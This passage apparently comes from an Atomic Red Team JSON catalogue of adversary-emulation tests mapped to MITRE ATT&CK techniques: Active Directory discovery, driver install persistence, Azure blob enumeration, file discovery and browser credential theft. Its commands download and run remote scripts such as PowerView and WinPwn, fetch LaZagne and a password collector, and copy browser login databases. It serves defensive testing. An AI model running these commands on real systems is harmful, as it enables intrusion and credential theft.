                        "prereq_command": "if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Invoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe\" -OutFile #{adfind_path}\n"
                    }
                ],
                "executor": {
                    "command": "#{adfind_path} -sc exchaddresses\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Enumerate Default Domain Admin Details (Domain)",
                "auto_generated_guid": "c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef",
                "description": "This test will enumerate the details of the built-in domain admin account\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "net user administrator /domain\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Enumerate Active Directory for Unconstrained Delegation",
                "auto_generated_guid": "46f8dbe9-22a5-4770-8513-66119c5be63b",
                "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "domain": {
                        "description": "Domain FQDN",
                        "type": "String",
                        "default": "$env:UserDnsDomain"
                    },
                    "uac_prop": {
                        "description": "UAC Property to search",
                        "type": "String",
                        "default": 524288
                    }
                },
                "dependencies": [
                    {
                        "description": "PowerShell ActiveDirectory Module must be installed\n",
                        "prereq_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n",
                        "get_prereq_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"
                    }
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": false,
                    "command": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}\n"
                }
            },
            {
                "name": "Get-DomainUser with PowerView",
                "auto_generated_guid": "93662494-5ed7-4454-a04c-8c8372808ac2",
                "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Enumerate Active Directory Users with ADSISearcher",
                "auto_generated_guid": "02e8be5a-3065-4e54-8cc8-a14d138834d3",
                "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": false,
                    "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()\n"
                }
            },
            {
                "name": "Enumerate Linked Policies In ADSISearcher Discovery",
                "auto_generated_guid": "7ab0205a-34e4-4a44-9b04-e1541d1a57be",
                "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": false,
                    "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n"
                }
            },
            {
                "name": "Enumerate Root Domain linked policies Discovery",
                "auto_generated_guid": "00c652e2-0750-4ca6-82ff-0204684a6fe4",
                "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": false,
                    "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n"
                }
            },
            {
                "name": "WinPwn - generaldomaininfo",
                "auto_generated_guid": "ce483c35-c74b-45a7-a670-631d1e69db3d",
                "description": "Gathers general domain information using the generaldomaininfo function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput",
                    "name": "powershell"
                }
            }
        ]
    },
    {
        "attack_technique": "T1547",
        "display_name": "Boot or Logon Autostart Execution",
        "atomic_tests": [
            {
                "name": "Add a driver",
                "auto_generated_guid": "cb01b3da-b0e7-4e24-bf6d-de5223526785",
                "description": "Install a driver via pnputil.exe lolbin\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "driver_inf": {
                        "description": "A built-in, already installed windows driver inf",
                        "type": "Path",
                        "default": "C:\\Windows\\INF\\usbstor.inf"
                    }
                },
                "executor": {
                    "command": "pnputil.exe /add-driver \"#{driver_inf}\"\n",
                    "name": "command_prompt"
                }
            }
        ]
    },
    {
        "attack_technique": "T1530",
        "display_name": "Data from Cloud Storage Object",
        "atomic_tests": [
            {
                "name": "Azure - Enumerate Azure Blobs with MicroBurst",
                "auto_generated_guid": "3dab4bcc-667f-4459-aea7-4162dd2d6590",
                "description": "Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n",
                "supported_platforms": [
                    "iaas:azure"
                ],
                "input_arguments": {
                    "base": {
                        "description": "Azure blob keyword to enumerate (Example, storage account name)",
                        "type": "String",
                        "default": "secure"
                    },
                    "output_file": {
                        "description": "File to output results to",
                        "type": "String",
                        "default": "$env:temp\\T1530Test1.txt"
                    },
                    "wordlist": {
                        "description": "File path to keywords for search permutations",
                        "type": "String",
                        "default": "$env:temp\\permutations.txt"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "The Invoke-EnumerateAzureBlobs module must exist in $env:temp.\n",
                        "prereq_command": "if (test-path $env:temp\\Invoke-EnumerateAzureBlobs.ps1){exit 0} else {exit 1}\n",
                        "get_prereq_command": "invoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1\" -outfile \"$env:temp\\Invoke-EnumerateAzureBlobs.ps1\"\n"
                    },
                    {
                        "description": "The wordlist file for search permutations must exist in $env:temp.\n",
                        "prereq_command": "if (test-path #{wordlist}){exit 0} else {exit 1}\n",
                        "get_prereq_command": "invoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt\" -outfile \"#{wordlist}\"\n"
                    }
                ],
                "executor": {
                    "command": "import-module \"$env:temp\\Invoke-EnumerateAzureBlobs.ps1\"\nInvoke-EnumerateAzureBlobs -base #{base} -permutations #{wordlist} -outputfile \"#{output_file}\"\n",
                    "cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Azure - Scan for Anonymous Access to Azure Storage (Powershell)",
                "auto_generated_guid": "146af1f1-b74e-4aa7-9895-505eb559b4b0",
                "description": "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n",
                "supported_platforms": [
                    "iaas:azure"
                ],
                "input_arguments": {
                    "base_name": {
                        "description": "Azure storage account name to test",
                        "type": "String",
                        "default": "T1530Test2"
                    },
                    "output_file": {
                        "description": "File to output results to",
                        "type": "String",
                        "default": "$env:temp\\T1530Test2.txt"
                    },
                    "container_name": {
                        "description": "Container name to search for (optional)",
                        "type": "String",
                        "default": null
                    },
                    "blob_name": {
                        "description": "Blob name to search for (optional)",
                        "type": "String",
                        "default": null
                    }
                },
                "executor": {
                    "command": "try{$response = invoke-webrequest \"https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}\" -method \"GET\"}\ncatch [system.net.webexception]\n{if($_.Exception.Response -ne $null)\n{$Response = $_.Exception.Response.GetResponseStream()\n$ReadResponse = New-Object System.IO.StreamReader($Response)\n$ReadResponse.BaseStream.Position = 0\n$responseBody = $ReadResponse.ReadToEnd()}\nelse {$responseBody = \"The storage account could not be anonymously accessed.\"}}\n\"Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody\" | out-file -filepath #{output_file} -append\n",
                    "cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n",
                    "name": "powershell"
                }
            }
        ]
    },
    {
        "attack_technique": "T1072",
        "display_name": "Software Deployment Tools",
        "atomic_tests": [
            {
                "name": "Radmin Viewer Utility",
                "auto_generated_guid": "b4988cad-6ed2-434d-ace5-ea2670782129",
                "description": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "radmin_installer": {
                        "description": "Radmin Viewer installer",
                        "type": "Path",
                        "default": "%TEMP%\\RadminViewer.msi"
                    },
                    "radmin_exe": {
                        "description": "The radmin.exe executable from RadminViewer.msi",
                        "type": "Path",
                        "default": "%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe"
                    }
                },
                "dependencies": [
                    {
                        "description": "Radmin Viewer Utility must be installed at specified location (#{radmin_exe})\n",
                        "prereq_command": "if not exist \"#{radmin_exe}\" (exit /b 1)\n",
                        "get_prereq_command": "echo Downloading radmin installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi\" #{radmin_installer}\nmsiexec /i \"#{radmin_installer}\" /qn\n"
                    }
                ],
                "executor": {
                    "name": "command_prompt",
                    "elevation_required": true,
                    "command": "\"#{radmin_exe}\""
                }
            }
        ]
    },
    {
        "attack_technique": "T1083",
        "display_name": "File and Directory Discovery",
        "atomic_tests": [
            {
                "name": "File and Directory Discovery (cmd.exe)",
                "auto_generated_guid": "0e36303b-6762-4500-b003-127743b80ba6",
                "description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "output_file": {
                        "description": "File to output results to",
                        "type": "String",
                        "default": "%temp%\\T1083Test1.txt"
                    }
                },
                "executor": {
                    "command": "dir /s c:\\ >> #{output_file}\ndir /s \"c:\\Documents and Settings\" >> #{output_file}\ndir /s \"c:\\Program Files\\\" >> #{output_file}\ndir \"%systemdrive%\\Users\\*.*\" >> #{output_file}\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> #{output_file}\ndir \"%userprofile%\\Desktop\\*.*\" >> #{output_file}\ntree /F >> #{output_file}\n",
                    "cleanup_command": "del #{output_file}\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "File and Directory Discovery (PowerShell)",
                "auto_generated_guid": "2158908e-b7ef-4c21-8a83-3ce4dd05a924",
                "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "ls -recurse\nget-childitem -recurse\ngci -recurse\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Nix File and Directory Discovery",
                "auto_generated_guid": "ffc8b249-372a-4b74-adcd-e4c0430842de",
                "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n",
                "supported_platforms": [
                    "macos",
                    "linux"
                ],
                "input_arguments": {
                    "output_file": {
                        "description": "Output file used to store the results.",
                        "type": "Path",
                        "default": "/tmp/T1083.txt"
                    }
                },
                "executor": {
                    "command": "ls -a >> #{output_file}\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;\nfile */* *>> #{output_file}\ncat #{output_file} 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n",
                    "cleanup_command": "rm #{output_file}\n",
                    "name": "sh"
                }
            },
            {
                "name": "Nix File and Directory Discovery 2",
                "auto_generated_guid": "13c5e1ae-605b-46c4-a79f-db28c77ff24e",
                "description": "Find or discover files on the file system\n",
                "supported_platforms": [
                    "macos",
                    "linux"
                ],
                "input_arguments": {
                    "output_file": {
                        "description": "Output file used to store the results.",
                        "type": "Path",
                        "default": "/tmp/T1083.txt"
                    }
                },
                "executor": {
                    "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}\nif [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;\nfind . -type f -iname *.pdf >> #{output_file}\ncat #{output_file}\nfind . -type f -name \".*\"\n",
                    "cleanup_command": "rm #{output_file}",
                    "name": "sh"
                }
            },
            {
                "name": "Simulating MAZE Directory Enumeration",
                "auto_generated_guid": "c6c34f61-1c3e-40fb-8a58-d017d88286d8",
                "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "File_to_output": {
                        "description": "File to output results to",
                        "type": "String",
                        "default": "$env:temp\\T1083Test5.txt"
                    }
                },
                "executor": {
                    "command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\")\nGet-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append #{File_to_output}\n$UsersFolder = \"$env:homedrive\\Users\\\"\nforeach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) \n{\nforeach ($secondarydirectory in $folderarray)\n {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}\n}\ncat #{File_to_output}\n",
                    "cleanup_command": "remove-item #{File_to_output} -ErrorAction SilentlyContinue\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Launch DirLister Executable",
                "auto_generated_guid": "c5bec457-43c9-4a18-9a24-fe151d8971b7",
                "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "dirlister_path": {
                        "description": "Path to the DirLister executable ",
                        "type": "String",
                        "default": "PathToAtomicsFolder\\T1083\\bin\\DirLister.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "DirLister.exe must exist in the specified path #{dirlister_path}\n",
                        "prereq_command": "if (Test-Path #{dirlister_path}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "$parentpath = Split-Path \"#{dirlister_path}\"\nInvoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile $env:TEMP\\TDirLister.v2.beta4.zip\nNew-Item -ItemType Directory -Force -Path $parentpath | Out-Null\nExpand-Archive -Path $env:TEMP\\TDirLister.v2.beta4.zip -DestinationPath $env:TEMP\\TDirLister.v2.beta4 -Force\nCopy-Item $env:TEMP\\TDirLister.v2.beta4\\* $parentpath -Recurse\nRemove-Item $env:TEMP\\TDirLister.v2.beta4.zip,$env:TEMP\\TDirLister.v2.beta4 -Recurse -ErrorAction Ignore\n"
                    }
                ],
                "executor": {
                    "command": "Start-Process #{dirlister_path}\nStart-Sleep -Second 4\nStop-Process -Name \"DirLister\"\n",
                    "name": "powershell"
                }
            }
        ]
    },
    {
        "attack_technique": "T1555.003",
        "display_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "atomic_tests": [
            {
                "name": "Run Chrome-password Collector",
                "auto_generated_guid": "8c05b133-d438-47ca-a630-19cc464c4622",
                "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of $env:TEMP\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "file_path": {
                        "description": "File path for modified Sysinternals",
                        "type": "String",
                        "default": "$env:TEMP"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Modified Sysinternals must be located at #{file_path}\n",
                        "prereq_command": "if (Test-Path #{file_path}\\SysInternals) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip\" -OutFile \"#{file_path}\\Modified-SysInternalsSuite.zip\"\nExpand-Archive #{file_path}\\Modified-SysInternalsSuite.zip #{file_path}\\sysinternals -Force\nRemove-Item #{file_path}\\Modified-SysInternalsSuite.zip -Force\n"
                    }
                ],
                "executor": {
                    "command": "Set-Location -path \"#{file_path}\\Sysinternals\";\n./accesschk.exe -accepteula .;\n",
                    "cleanup_command": "Remove-Item #{file_path}\\Sysinternals -Force -Recurse -ErrorAction Ignore\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Search macOS Safari Cookies",
                "auto_generated_guid": "c1402f7b-67ca-43a8-b5f3-3143abedc01b",
                "description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n",
                "supported_platforms": [
                    "macos"
                ],
                "input_arguments": {
                    "search_string": {
                        "description": "String to search Safari cookies to find.",
                        "type": "String",
                        "default": "coinbase"
                    }
                },
                "executor": {
                    "command": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n",
                    "name": "sh"
                }
            },
            {
                "name": "LaZagne - Credentials from Browser",
                "auto_generated_guid": "9a2915b3-3954-4cce-8c76-00fbf4dbd014",
                "description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "lazagne_path": {
                        "description": "Path to LaZagne",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "LaZagne.exe must exist on disk at specified location (#{lazagne_path})\n",
                        "prereq_command": "if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "New-Item -Type Directory (split-path #{lazagne_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe\" -OutFile \"#{lazagne_path}\"\n"
                    }
                ],
                "executor": {
                    "name": "command_prompt",
                    "elevation_required": true,
                    "command": "#{lazagne_path} browsers\n"
                }
            },
            {
                "name": "Simulating access to Chrome Login Data",
                "auto_generated_guid": "3d111226-d09a-4911-8715-fe11664f960d",
                "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n",
                "supported_platforms": [
                    "windows"
                ],
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Chrome must be installed\n",
                        "prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
                        "get_prereq_command": "$installer = \"$env:temp\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile $env:temp\\ChromeStandaloneSetup64.msi https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"
                    }
                ],
                "executor": {
                    "name": "powershell",
                    "command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination $env:temp\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination $env:temp\n",
                    "cleanup_command": "Remove-Item -Path \"$env:temp\\Login Data\" -Force -ErrorAction Ignore\nRemove-Item -Path \"$env:temp\\Login Data For Account\" -Force -ErrorAction Ignore\n"
                }
            },
            {
                "name": "Simulating access to Opera Login Data",
                "auto_generated_guid": "28498c17-57e4-495a-b0be-cc1e36de408b",
                "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n",
                "supported_platforms": [
                    "windows"
                ],
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Opera must be installed\n",
                        "prereq_command": "if (((Test-Path \"$env:LOCALAPPDATA\\Programs\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Opera\\launcher.exe\"))) {exit 0} else {exit 1}",
                        "get_prereq_command": "$installer = \"$env:temp\\OperaStandaloneInstaller.exe\"\nInvoke-WebRequest -OutFile $env:temp\\OperaStandaloneInstaller.exe https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe\nStart-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'\nStart-Sleep -s 180\nStop-Process -Name \"opera\"\n"
                    },
                    {
                        "description": "Opera login data file must exist\n",
                        "prereq_command": "if (Test-Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\") {exit 0} else {exit 1}",
                        "get_prereq_command": "New-Item -Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -ItemType File\n"
                    }
                ],
                "executor": {
                    "name": "powershell",
                    "command": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination $env:temp\n",
                    "cleanup_command": "Remove-Item -Path \"$env:temp\\Login Data\" -Force -ErrorAction Ignore\n"
                }
            },
            {
                "name": "Simulating access to Windows Firefox Login Data",
                "auto_generated_guid": "eb8da98a-2e16-4551-b3dd-83de49baa14c",
                "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n",
                "supported_platforms": [
                    "windows"
                ],
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Firefox must be installed\n",
                        "prereq_command": "if ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}",
                        "get_prereq_command": "if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\"}else {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US\"}\n$installer = \"$env:temp\\firefoxsetup.exe\"\n(New-Object Net.WebClient).DownloadFile($url,$installer)\nStart-Process $installer -ArgumentList '/S' -Wait\n"
                    },
                    {
                        "description": "Firefox login data file must exist\n",
                        "prereq_command": "if (Test-Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\") {exit 0} else {exit 1}",
                        "get_prereq_command": "if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox=\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"}else {$firefox=\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\"}\nStart-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait\nStart-Process $firefox -NoNewWindow\nStart-Sleep -s 20\nStop-Process -Name firefox\n"
                    }
                ],
                "executor": {
                    "name": "powershell",
                    "command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination $env:temp -Force -Recurse\n",
                    "cleanup_command": "Remove-Item -Path \"$env:temp\\Profiles\" -Force -ErrorAction Ignore -Recurse\n"
                }
            },
            {
                "name": "Simulating access to Windows Edge Login Data",
                "auto_generated_guid": "a6a5ec26-a2d1-4109-9d35-58b867689329",
                "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n",
                "supported_platforms": [
                    "windows"
                ],
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Edge must be installed\n",
                        "prereq_command": "if (Test-Path \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\") {exit 0} else {exit 1}",
                        "get_prereq_command": "\"Installation is not implemented as Edge is a part of windows\"\n"
                    },
                    {
                        "description": "Edge login data file must exist\n",
                        "prereq_command": "if (Test-Path \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\") {exit 0} else {exit 1}",
                        "get_prereq_command": "$edge=\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\nStart-Process $edge \nStart-Sleep -s 20\nStop-Process -Name msedge\n"
                    }
                ],
                "executor": {
                    "name": "powershell",
                    "command": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination $env:temp\\Edge -Force -Recurse\n",
                    "cleanup_command": "Remove-Item -Path \"$env:temp\\Edge\" -Force -ErrorAction Ignore -Recurse\n"
                }
            },
            {
                "name": "Decrypt Mozilla Passwords with Firepwd.py",
                "auto_generated_guid": "dc9cd677-c70f-4df5-bd1c-f114af3c2381",
                "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "Firepwd_Path": {
                        "description": "Filepath for Firepwd.py",
                        "type": "String",
                        "default": "$env:temp\\Firepwd.py"
                    },
                    "Out_Filepath": {
                        "description": "Filepath to output results to",
                        "type": "String",
                        "default": "$env:temp\\T1555.003Test8.txt"
                    },
                    "VS_CMD_Path": {
                        "description": "Filepath to Visual Studio Build Tools Command prompt",
                        "type": "String",
                        "default": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat"
                    },
                    "Python_Path": {
                        "description": "Filepath to python",
                        "type": "String",
                        "default": "C:\\Program Files\\Python310\\python.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Firepwd must exist at #{Firepwd_Path}\n",
                        "prereq_command": "if (Test-Path \"#{Firepwd_Path}\") {exit 0} else {exit 1}\n",
